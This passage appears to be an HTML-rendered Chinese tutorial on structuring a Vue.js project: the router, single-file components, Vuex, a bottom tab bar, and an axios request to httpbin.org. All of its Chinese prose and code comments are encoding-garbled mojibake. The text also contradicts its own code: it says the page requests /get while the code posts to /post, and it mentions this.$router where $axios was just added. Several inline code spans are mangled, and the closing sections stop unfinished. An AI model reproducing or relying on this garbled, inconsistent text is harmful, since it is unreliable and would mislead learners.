<span class="kr">import</span> <span class="nx">App</span> <span class="nx">from</span> <span class="s1">&#39;./App.vue&#39;</span>
<span class="kr">import</span> <span class="nx">router</span> <span class="nx">from</span> <span class="s1">&#39;./router&#39;</span>
<span class="kr">import</span> <span class="nx">store</span> <span class="nx">from</span> <span class="s1">&#39;./store&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>
<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="nx">router</span><span class="p">,</span> <span class="c1">// ‰ΩøÁî®vue-routerÊèí‰ª∂
</span><span class="c1"></span>  <span class="nx">store</span><span class="p">,</span> <span class="c1">// ‰ΩøÁî®vuexÊèí‰ª∂
</span><span class="c1"></span>  <span class="nx">render</span><span class="o">:</span> <span class="nx">h</span> <span class="p">=&gt;</span> <span class="nx">h</span><span class="p">(</span><span class="nx">App</span><span class="p">)</span> <span class="c1">// Ê∏≤ÊüìÈ°µÈù¢
</span><span class="c1"></span><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span> <span class="c1">// ÁªëÂÆöÂà∞ index.html -&gt; div#app
</span></code></pre></div><p>ÂÖ∂‰∏≠Ê∏≤ÊüìÁöÑÈ°µÈù¢‰Ωç‰∫é <code>src/App.vue</code></p>
<hr>
<blockquote>
<p>xxx.vue ÊòØvue‰∏≠ÁöÑ<a href="https://cn.vuejs.org/v2/guide/single-file-components.html">ÂçïÊñá‰ª∂ÁªÑ‰ª∂</a>ÔºåÂ∞Ü <code>html css javascript</code> ÈõÜÂêàÂú®Âêå‰∏Ä‰∏™Êñá‰ª∂Ôºå‰æø‰∫éÁªÑÁªáÁÆ°ÁêÜ</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/App.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;nav&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">to</span><span class="o">=</span><span class="s">&#34;/&#34;</span><span class="p">&gt;</span>Home<span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">to</span><span class="o">=</span><span class="s">&#34;/about&#34;</span><span class="p">&gt;</span>About<span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">router-view</span><span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">#</span><span class="nn">app</span> <span class="p">{</span>
  <span class="k">font-family</span><span class="p">:</span> <span class="s1">&#39;Avenir&#39;</span><span class="p">,</span> <span class="n">Helvetica</span><span class="p">,</span> <span class="n">Arial</span><span class="p">,</span> <span class="kc">sans-serif</span><span class="p">;</span>
  <span class="kp">-webkit-</span><span class="n">font-smoothing</span><span class="p">:</span> <span class="n">antialiased</span><span class="p">;</span>
  <span class="kp">-moz-</span><span class="n">osx-font-smoothing</span><span class="p">:</span> <span class="n">grayscale</span><span class="p">;</span>
  <span class="k">text-align</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#2c3e50</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="p">{</span>
  <span class="k">padding</span><span class="p">:</span> <span class="mi">30</span><span class="kt">px</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="nt">a</span> <span class="p">{</span>
  <span class="k">font-weight</span><span class="p">:</span> <span class="kc">bold</span><span class="p">;</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#2c3e50</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="nt">a</span><span class="p">.</span><span class="nc">router-link-exact-active</span> <span class="p">{</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#42b983</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>ÂÖ∂‰∏≠ <code>ÊòØÈ°µÈù¢ÁöÑ `html` ÂÖÉÁ¥†Ôºå`style` ÊòØÊ†∑ÂºèÂÖÉÁ¥†ÔºåËøòÂèØ‰ª•Ê∑ªÂä†‰∏Ä‰∏™ `javascript` ‰∏∫jsÂÖÉÁ¥†„ÄÇÂÖ∂‰∏≠</code> ÊòØË∑ØÁî±ÁªÑ‰ª∂Ôºå‰ºöË¢´Ëá™Âä®Ê∏≤ÊüìÊàêÂΩìÂâçË∑ØÁî±ÂØπÂ∫îÁöÑÈ°µÈù¢</p>
<hr>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">router</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">Router</span> <span class="nx">from</span> <span class="s1">&#39;vue-router&#39;</span>
<span class="kr">import</span> <span class="nx">Home</span> <span class="nx">from</span> <span class="s1">&#39;./views/Home.vue&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Router</span><span class="p">)</span>
<span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Router</span><span class="p">({</span>
  <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;history&#39;</span><span class="p">,</span>
  <span class="nx">base</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">BASE_URL</span><span class="p">,</span>
  <span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
    <span class="p">{</span>
      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span>
      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;home&#39;</span><span class="p">,</span>
      <span class="nx">component</span><span class="o">:</span> <span class="nx">Home</span>
    <span class="p">},</span>
    <span class="p">{</span>
      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/about&#39;</span><span class="p">,</span>
      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;about&#39;</span><span class="p">,</span>
      <span class="c1">// route level code-splitting
</span><span class="c1"></span>      <span class="c1">// this generates a separate chunk (about.[hash].js) for this route
</span><span class="c1"></span>      <span class="c1">// which is lazy-loaded when the route is visited.
</span><span class="c1"></span>      <span class="nx">component</span><span class="o">:</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="kr">import</span><span class="p">(</span><span class="cm">/* webpackChunkName: &#34;about&#34; */</span> <span class="s1">&#39;./views/About.vue&#39;</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">]</span>
<span class="p">})</span>
</code></pre></div><p>Â¶Ç <code>http://localhost:8080/</code> ‰∏ã <code>Ë¢´Ê∏≤ÊüìÊàê `home` È°µÈù¢Ôºå`http://localhost:8080/about` ‰∏ã</code> Ë¢´Ê∏≤ÊüìÊàê <code>about</code> È°µÈù¢„ÄÇ</p>
<blockquote>
<p>ÊäÄÂ∑ß ËøôÈáåÂä†ËΩΩÁªÑ‰ª∂‰ΩøÁî®ÂáΩÊï∞Âä†ËΩΩÔºåÂ∞±ÂèØ‰ª•ÂÆûÁé∞ÊáíÂä†ËΩΩ‰ª•‰ºòÂåñÊÄßËÉΩ„ÄÇ</p>
</blockquote>
<hr>
<p><code>src/views/</code> ÂàôÊòØ‰øùÂ≠òÈ°µÈù¢Êñá‰ª∂Ôºå‰æãÂ¶Ç</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/views/Home.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;home&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#34;Vue logo&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;../assets/logo.png&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">HelloWorld</span> <span class="na">msg</span><span class="o">=</span><span class="s">&#34;Welcome to Your Vue.js App&#34;</span><span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="c1">// @ is an alias to /src
</span><span class="c1"></span><span class="kr">import</span> <span class="nx">HelloWorld</span> <span class="nx">from</span> <span class="s1">&#39;@/components/HelloWorld.vue&#39;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;home&#39;</span><span class="p">,</span>
  <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">HelloWorld</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div><p>ËøôÂ∞±ÊòØË∑ØÁî± <code>home</code> ÂØπÂ∫îÁöÑÈ°µÈù¢ÔºåÂÖ∂‰∏≠Áî®Âà∞‰∫Ü <code>HelloWorld</code> ÁªÑ‰ª∂ÔºåÈúÄË¶ÅÂú®js‰∏≠ÂºïÂÖ•„ÄÇ</p>
<hr>
<p><code>src/components/</code> ÈáåÈù¢‰øùÂ≠òÂèØÂ§çÁî®ÁöÑÁªÑ‰ª∂Ôºå‰æãÂ¶Ç‰∏äÈù¢ÁöÑ `` Â∞±ÊòØ‰∏Ä‰∏™Áã¨Á´ãÁöÑÁªÑ‰ª∂ÔºàcomponentÔºâ</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/components/HelloWorld.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;hello&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>{{ msg }}<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
      For a guide and recipes on how to configure / customize this project,<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
      check out the
      <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://cli.vuejs.org&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;_blank&#34;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;noopener&#34;</span><span class="p">&gt;</span>vue-cli documentation<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>.
    <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;HelloWorld&#39;</span><span class="p">,</span>
  <span class="nx">props</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">msg</span><span class="o">:</span> <span class="nb">String</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="c">&lt;!-- Add &#34;scoped&#34; attribute to limit CSS to this component only --&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
<span class="nt">h1</span> <span class="p">{</span>
  <span class="k">margin</span><span class="p">:</span> <span class="mi">40</span><span class="kt">px</span> <span class="mi">0</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>ËøôÂ∞±ÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑÁªÑ‰ª∂ÔºåÁªìÊûÑÂ∞±ÊòØ‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑÂçïÊñáÊú¨ÁªÑ‰ª∂ÔºåËØ¥ÊòéÁªÑ‰ª∂Â∞±ÊòØÊää‰∏ÄÈÉ®ÂàÜÈ°µÈù¢ÈÄªËæëÊäΩÂá∫Êù•ÁªÑÊàê‰∏Ä‰∏™Êñá‰ª∂„ÄÇËøôÊ†∑ÁöÑÂ•ΩÂ§ÑÊòØÂàÜÁ¶ª‰∏éÈ°µÈù¢Êó†ÂÖ≥ÁöÑÁªÑ‰ª∂Ôºå‰ΩøÈ°µÈù¢ÈÄªËæëÊõ¥Âä†Ê∏ÖÊô∞ÔºåÂêåÊó∂‰πü‰æø‰∫éÂ§çÁî®ÁªÑ‰ª∂„ÄÇÂ¶ÇÊûúÊúâ‰ª•‰∏ãÊÉÖÂÜµÔºåÊàëÂª∫ËÆÆÊääÈÉ®ÂàÜ‰ª£Á†ÅÂàÜÁ¶ªÊàêÁã¨Á´ãÁöÑÁªÑ‰ª∂Ôºö</p>
<ol>
<li>ÈúÄË¶ÅÂ§öÊ¨°Â§çÁî®ÁöÑÁªÑ‰ª∂ÔºåÂ¶ÇÂü∫Á°ÄÊåâÈíÆ„ÄÅË°®ÂçïÁ≠â</li>
<li>ËæÉ‰∏∫Â§çÊùÇ‰ΩÜ‰∏éÈ°µÈù¢ÈÄªËæëÊó†ÂÖ≥ÁöÑÔºåÂ¶ÇÈ°µÈù¢ÁöÑHeader„ÄÅFooterÁ≠â</li>
</ol>
<blockquote>
<p>ÊäÄÂ∑ß Âú® <code>style</code> Ë°®ÊÉÖ‰∏äÊ∑ªÂä† <code>scoped</code> Â±ûÊÄßÂèØ‰ª•ÈôêÂà∂CSSÁîüÊïàËåÉÂõ¥‰∏∫ËØ•ÁªÑ‰ª∂Ôºå‰∏ç‰ºöÂΩ±ÂìçÂÖ∂‰ªñÂÖÉÁ¥†ÔºåÂú®ÁºñËØëÊó∂vueËß£ÈáäÂô®‰ºöÁªôËøô‰∫õcssÂ±ûÊÄßÂä†‰∏äÈöèÊú∫ÁöÑhash‰øùËØÅÂîØ‰∏Ä</p>
</blockquote>
<hr>
<p>vueËøòÊèê‰æõ‰∫Ü‰∏Ä‰∏™Áä∂ÊÄÅÁÆ°ÁêÜÊ®°Âºè <a href="https://vuex.vuejs.org/zh/">vuex</a>ÔºåÂèØ‰ª•ÂæàÊñπ‰æøÁöÑÁÆ°ÁêÜÊâÄÊúâÁªÑ‰ª∂ÁöÑÁä∂ÊÄÅ„ÄÇÂØπÂ∫îÊñá‰ª∂ <code>src/store.js</code></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">store</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">Vuex</span> <span class="nx">from</span> <span class="s1">&#39;vuex&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Vuex</span><span class="p">)</span>
<span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Vuex</span><span class="p">.</span><span class="nx">Store</span><span class="p">({</span>
  <span class="nx">state</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">},</span>
  <span class="nx">mutations</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">},</span>
  <span class="nx">actions</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">}</span>
<span class="p">})</span>
</code></pre></div><p><del>Áî±‰∫éÊàëËøòÊ≤°Áî®Ëøá <code>vuex</code> ÊâÄ‰ª•Ëá™Â∑±ÁúãÊñáÊ°£Âêß</del></p>
<p>ÂØπ‰∫éÁÆÄÂçïÁöÑÂ∫îÁî®‰πüÂèØ‰ª•‰∏çÁî® <code>vuex</code> Ôºå‰∏Ä‰∏™ÁÆÄÂçïÁöÑ <a href="https://cn.vuejs.org/v2/guide/state-management.html#%E7%AE%80%E5%8D%95%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E8%B5%B7%E6%AD%A5%E4%BD%BF%E7%94%A8"><code>store</code> Ê®°Âºè</a> Â∞±Ë∂≥Â§ü‰∫Ü</p>
<h1 id="0x4-ÂºÄÂèëÊåáÂºï">0x4 ÂºÄÂèëÊåáÂºï</h1>
<p>Êúâ‰∫Ü‰∏äÈù¢ÁöÑÂü∫Á°ÄÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ÂºÄÂßãÂÜô‰ª£Á†Å‰∫ÜÔºåËøôÈáå‰ª•Ê∑ªÂä†‰∏Ä‰∏™ <code>Foo</code> È°µÈù¢Â±ïÁ§∫‰ªéËøúÁ´ØËé∑ÂæóÁöÑÊï∞ÊçÆ‰∏∫‰æã</p>
<h2 id="1-ÁªôÈ°µÈù¢Ê∑ªÂä†‰∏Ä‰∏™-tab">1. ÁªôÈ°µÈù¢Ê∑ªÂä†‰∏Ä‰∏™ <code>Tab</code></h2>
<p><code>Tab</code> Â±û‰∫é‰∏éÈ°µÈù¢ÈÄªËæëÊó†ÂÖ≥Ôºå‰ΩÜÂèàÂ§ÑÂ§ÑË¶Å‰ΩøÁî®ÁöÑÂÖÉÁ¥†ÔºåÊâÄ‰ª•Êàë‰ª¨Â∞ÜÂÖ∂Áã¨Á´ãÊàê‰∏∫‰∏Ä‰∏™ÁªÑ‰ª∂</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/components/Tab.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;tab&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>home<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/about&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>about<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/foo&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>foo<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Tab&#39;</span><span class="p">,</span>
  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">router</span> <span class="p">(</span><span class="nx">url</span><span class="p">){</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">$router</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
<span class="p">#</span><span class="nn">tab</span> <span class="p">{</span>
  <span class="k">display</span><span class="p">:</span> <span class="kc">flex</span><span class="p">;</span>
  <span class="k">justify-content</span><span class="p">:</span> <span class="kc">space</span><span class="o">-</span><span class="n">around</span><span class="p">;</span>
  <span class="k">align-items</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">bottom</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">position</span><span class="p">:</span> <span class="kc">fixed</span><span class="p">;</span>
  <span class="k">height</span><span class="p">:</span> <span class="mi">65</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">left</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
  <span class="k">background-color</span><span class="p">:</span> <span class="kc">aquamarine</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">.</span><span class="nc">item</span> <span class="p">{</span>
  <span class="k">padding-top</span><span class="p">:</span> <span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">display</span><span class="p">:</span> <span class="kc">flex</span><span class="p">;</span>
  <span class="k">flex-direction</span><span class="p">:</span> <span class="kc">column</span><span class="p">;</span>
  <span class="k">justify-content</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">align-items</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">height</span><span class="p">:</span> <span class="mi">50</span><span class="kt">px</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>Âú®ËøôÈáåÊàë‰ª¨ÂàõÂª∫‰∫Ü‰∏Ä‰∏™Â∫ïÈÉ®ÂØºËà™Ê†èÔºåÊúâ‰∏â‰∏™ <code>Tab</code> ÔºåÂπ∂‰∏îÂØπÂ∫îË∑≥ËΩ¨Âà∞‰∏çÂêåÁöÑÈ°µÈù¢</p>
<h2 id="2-ÂàõÂª∫-foovue-Áõ∏ÂÖ≥ÈÄªËæëÂπ∂‰∏éÂêéÁ´Ø‰∫§‰∫í">2. ÂàõÂª∫ <code>Foo.vue</code> Áõ∏ÂÖ≥ÈÄªËæëÂπ∂‰∏éÂêéÁ´Ø‰∫§‰∫í</h2>
<p>Âõ†‰∏∫Êàë‰ª¨ÈúÄË¶Å‰ªéËøúÁ´ØAPIËé∑ÂèñÊï∞ÊçÆÂπ∂ËøõË°åÂ±ïÁ§∫ÔºåÂ∞±Ê∂âÂèäÁΩëÁªúËØ∑Ê±Ç„ÄÇÂú®vue‰∏≠ÔºåÂÆòÊñπÊé®Ëçê‰ΩøÁî® <a href="https://github.com/axios/axios">axios</a> ÂèëËµ∑ËØ∑Ê±Ç„ÄÇ<code>axios</code> ÊòØ‰∏Ä‰∏™Âü∫‰∫é <code>promise</code> ÁöÑÂºÇÊ≠•ÁΩëÁªúËØ∑Ê±ÇÂ∫ìÔºåÁõ∏ÂÖ≥Áî®Ê≥ïÂèØÂèÇËÄÉÊñáÊ°£ÊàñÁΩë‰∏äÊïôÁ®ã</p>
<p>ÂÆâË£Ö <code>axios</code></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">yarn add axios
</code></pre></div><p>Êé•ÁùÄÂú® <code>src/main.js</code> ‰∏≠Âä†ÂÖ•‰ª•‰∏ãËØ≠Âè•ÂêØÁî® <code>axios</code></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kr">import</span> <span class="nx">Axios</span> <span class="nx">from</span> <span class="s1">&#39;axios&#39;</span>
<span class="c1">// ÊääaxiosÊ∑ªÂä†Âà∞ÂéüÂûãÈìæ
</span><span class="c1"></span><span class="nx">Vue</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">$axios</span> <span class="o">=</span> <span class="nx">Axios</span>
</code></pre></div><p>Áé∞Âú®Â∞±ÂèØ‰ª•Âú®vueÂÆû‰æã‰∏≠Áî® <code>this.$router</code> Êù•ËÆøÈóÆË∑ØÁî±‰∫Ü</p>
<hr>
<p>Êé•ÁùÄÊù•ÂàõÂª∫ <code>Foo.vue</code></p>
<div class="highlight"><pre class="chroma"><code class="language-vue" data-lang="vue"><span class="nx">src</span><span class="o">/</span><span class="nx">views</span><span class="o">/</span><span class="nx">Foo</span><span class="p">.</span><span class="nx">vue</span>

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;foo&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;{{</span> <span class="nx">result</span> <span class="p">}}&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">button</span> <span class="nt">@click</span><span class="s">=&#34;bar()&#34;</span><span class="p">&gt;</span><span class="na">bar</span><span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Foo&#39;</span><span class="p">,</span>
  <span class="nx">data</span><span class="p">(){</span>
    <span class="k">return</span> <span class="p">{</span>
      <span class="nx">result</span> <span class="o">:</span> <span class="s1">&#39;naive&#39;</span>
    <span class="p">}</span>
  <span class="p">},</span>
  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">bar</span><span class="p">(){</span>
      <span class="cm">/* eslint-disable */</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">result</span> <span class="o">=</span> <span class="s1">&#39;loading...&#39;</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">$axios</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;http://httpbin.org/post&#39;</span><span class="p">)</span>
        <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">result</span> <span class="o">=</span> <span class="nx">res</span><span class="p">})</span>
        <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">res</span><span class="p">)})</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p><del>ÂÖ∑‰ΩìÂÆûÁé∞‰ª£Á†ÅÈáåÈù¢ÂæàÊ∏ÖÊ•ö‰∫Ü</del> Ëøô‰∏™Êñá‰ª∂ÁöÑ‰ΩúÁî®Â∞±ÊòØËØ∑Ê±Ç <code>http://httpbin.org/get</code> Âπ∂ÊääÁªìÊûúÊòæÁ§∫Âú®ÁïåÈù¢‰∏ä</p>
<p><strong>Ê≥®ÊÑèÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑÈ°πÁõÆ‰ºöÊúâ<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">Ë∑®Âüü(CORS)ÈóÆÈ¢ò</a>ÔºåËøô‰∏™ÈóÆÈ¢òÊØîËæÉÂ§çÊùÇÔºåÂ∑®ÂùëÔºåÁΩë‰∏ä‰πüÊúâËæÉÂ§öËß£ÂÜ≥ÁöÑÊñáÁ´†<del>ÂíïÂíïÂíï</del></strong></p>
<h1 id="0x5-ÊäÄÂ∑ßÂèäÂùë‰ª¨">0x5 ÊäÄÂ∑ßÂèäÂùë‰ª¨</h1>
<p>ËøôÈáå‰ªãÁªç‰∏Ä‰∫õÊàëÂÜôvueÈ°πÁõÆÈÅáÂà∞ÁöÑÂùëÂíå‰ΩøÁî®ÁöÑÊäÄÂ∑ß</p>
<h2 id="data-methods-computed-props-ÁöÑÂå∫Âà´">data methods computed props ÁöÑÂå∫Âà´</h2>
<p><del>TODO</del></p>
<p>vue‰∏≠Â≠òÂÇ®Êï∞ÊçÆÊúâÂá†ÁßçÊñπÂºè‚Äî‚Äîdata„ÄÅ</p>
<h1 id="0x6-ÁªìËØ≠">0x6 ÁªìËØ≠</h1>
